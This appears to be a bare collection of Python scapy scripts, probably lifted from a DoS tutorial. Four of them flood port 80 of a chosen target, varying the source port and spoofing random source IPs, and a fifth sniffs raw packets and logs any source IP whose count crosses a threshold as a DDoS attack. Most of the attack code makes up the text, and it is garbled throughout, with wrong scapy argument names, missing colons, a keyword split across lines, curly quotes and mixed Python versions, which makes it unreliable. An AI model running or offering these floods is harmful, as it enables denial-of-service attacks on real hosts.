
from scapy.all import *
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   print ("packet sent ", i)
      i = i + 1
      
     from scapy.all import *
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
i = 1

while True:
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt, inter = .001)
      
      print ("packet sent ", i)
         i = i + 1
         
         
        from scapy.all import *
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1
w
hile True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   
   Source_ip = a + dot + b + dot + c + dot + d
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt,inter = .001)
   print ("packet sent ", i)
      i = i + 1
     Import random
from scapy.all import *
target_IP = input("Enter IP address of Target: ")
i = 1

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
   
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
      
      print ("packet sent ", i)
         i = i + 1
        import socket
import struct

from datetime import datetime
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
dict = {}
file_txt = open("attack_DDoS.txt",'a')
t1 = str(datetime.now())
file_txt.writelines(t1)
file_txt.writelines("\n")
No_of_IPs = 15
R_No_of_IPs = No_of_IPs +10
   while True:
      pkt = s.recvfrom(2048)
      ipheader = pkt[0][14:34]
      ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
      IP = socket.inet_ntoa(ip_hdr[3])
      print "The Source of the IP is:", IP
      
     if dict.has_key(IP):
   dict[IP] = dict[IP]+1
   print dict[IP]
   
  if(dict[IP] > No_of_IPs) and (dict[IP] < R_No_of_IPs) :
   line = "DDOS attack is Detected: "
   file_txt.writelines(line)
   file_txt.writelines(IP)
   file_txt.writelines("\n")
else:
   dict[IP] = 1
   
